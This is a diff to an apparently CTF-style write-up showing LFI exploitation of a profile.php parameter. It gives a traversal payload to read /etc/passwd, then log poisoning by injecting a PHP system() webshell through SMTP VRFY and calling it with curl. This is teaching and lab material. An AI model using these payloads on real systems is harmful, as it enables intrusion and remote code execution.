@@ -40,9 +40,11 @@ I performed a brute force attack using `ffuf`, with the [wordlist](https://githu
 * Cookie: `-H "Cookie: PHPSESSID=xxxx"`&#x20;
 * Filter out empty responses: `--fs 0`
 
+{% code overflow="wrap" %}
 ```sh
 $ ffuf -w /<wordlist> -u http://<target>:50000/profile.php?img=FUZZ -H "Cookie: PHPSESSID=xxxx" --fs 0
 ```
+{% endcode %}
 
 The payload: `....//....//....//....//....//....//....//....//....//etc/passwd` was found to work:
 
@@ -58,11 +60,55 @@ This provides us the following information:
 
 {% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md" %}
 
-Following the guide in the link above, I explored a few methods to gain RCE on the system.
+Following the guide in the link above, I explored a few methods to gain RCE on the system. From the previous enumeration steps, we have found multiple open ports/services, where some of them provides use a means to escalate the LFI to RCE.
 
-#### 1. SMTP (port 25)
+#### Log poisoning
 
-#### 2. SSH (port 22)
+I tried accessing the following log files (appended to found payload above):
+
+```
+/var/log/apache/access.log
+/var/log/apache/error.log
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/sshd.log
+/var/log/mail
+/var/log/httpd/error_log
+/usr/local/apache/log/error_log
+/usr/local/apache2/log/error_log
+```
+
+#### 1. SMTP (port 25)  \~ `/var/log/syslog`
+
+From enumeration of the _**SMTP**_ commands, I found a few that will directly log user inputs into the log file:
+
+```sh
+1. RCPT TO:<input> # requires MAIL TO:<addr> before
+2. VRFY <input>
+```
+
+With this in mind, we can exploit this to achieve RCE. Let's use the _**VRFY**_ command:
+
+```sh
+VRFY <?php system($_GET['cmd']); ?>
+```
+
+Now, reading the `/var/log/syslog` via the LFI vulnerability, we have gained a webshell. We can access it via the command:
+
+{% code overflow="wrap" %}
+```sh
+$ curl 'http://xxx.xxx.xxx.xxx:50000/profile.php?img=....//....//....//....//....//....//....//....//....//var/log/syslog&cmd=<command>' -H "Cookie: PHPSESSID=xxxx" --silent | tail -n 20
+
+```
+{% endcode %}
+
+The following command allows us to read the last 20 lines of the log file. Remember to replace `<command>` with the actual command, and set the **PHPSESSID**.
+
+We can now replace the command to look around the directory and view the contents of the text file to retrieve our final flag!
+
+#### 2. SSH (port 22) \~ `/var/log/auth.log`&#x20;
+
+...
 
 #### Interesting discovery
 
